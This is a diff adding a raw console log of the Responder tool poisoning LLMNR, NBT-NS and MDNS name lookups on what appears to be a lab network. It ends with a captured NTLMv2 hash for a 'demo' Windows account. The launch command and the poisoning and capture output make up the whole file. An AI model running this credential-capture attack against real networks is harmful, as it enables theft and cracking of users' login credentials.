@@ -1,0 +1,81 @@
+[root@localhost Responder-3.1.3.0]# python3 Responder.py -I ens192
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [ens192]
+    Responder IP               [192.168.110.23]
+    Responder IPv6             [fe80::65e3:f32:64e4:8650]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-38ZXLXH53TW]
+    Responder Domain Name      [4OEV.LOCAL]
+    Responder DCE-RPC Port     [47990]
+
+[+] Listening for events...
+
+[*] [MDNS] Poisoned answer sent to 192.168.110.19  for name yyyyyy.local
+[*] [NBT-NS] Poisoned answer sent to 192.168.110.19 for name YYYYYY (service: File Server)
+[*] [MDNS] Poisoned answer sent to fe80::6735:7c89:f993:3e1c%ens192 for name yyyyyy.local
+[*] [LLMNR]  Poisoned answer sent to fe80::6735:7c89:f993:3e1c%ens192 for name yyyyyy
+[*] [MDNS] Poisoned answer sent to 192.168.110.19  for name yyyyyy.local
+[*] [LLMNR]  Poisoned answer sent to 192.168.110.19 for name yyyyyy
+[*] [MDNS] Poisoned answer sent to fe80::6735:7c89:f993:3e1c%ens192 for name yyyyyy.local
+[*] [LLMNR]  Poisoned answer sent to fe80::6735:7c89:f993:3e1c%ens192 for name yyyyyy
+[*] [LLMNR]  Poisoned answer sent to 192.168.110.19 for name yyyyyy
+[SMB] NTLMv2-SSP Client   : fe80::6735:7c89:f993:3e1c%ens192
+[SMB] NTLMv2-SSP Username : DESKTOP-7ES8JHK\demo
+[SMB] NTLMv2-SSP Hash     : demo::DESKTOP-7ES8JHK:4dfed5a3a228c8a6:6EF6E68E80E67B015A7D28FC738AC80F:010100000000000000AE35C352A8D9013A6C1BD64B56E716000000000200080034004F004500560001001E00570049004E002D00330038005A0058004C0058004800350033005400570004003400570049004E002D00330038005A0058004C005800480035003300540057002E0034004F00450056002E004C004F00430041004C000300140034004F00450056002E004C004F00430041004C000500140034004F00450056002E004C004F00430041004C000700080000AE35C352A8D90106000400020000000800300030000000000000000100000000200000CE7B57564A7D73EB374917627674C7E90355B175D7D82C57FC60C78AEC14C5B90A001000000000000000000000000000000000000900160063006900660073002F007900790079007900790079000000000000000000
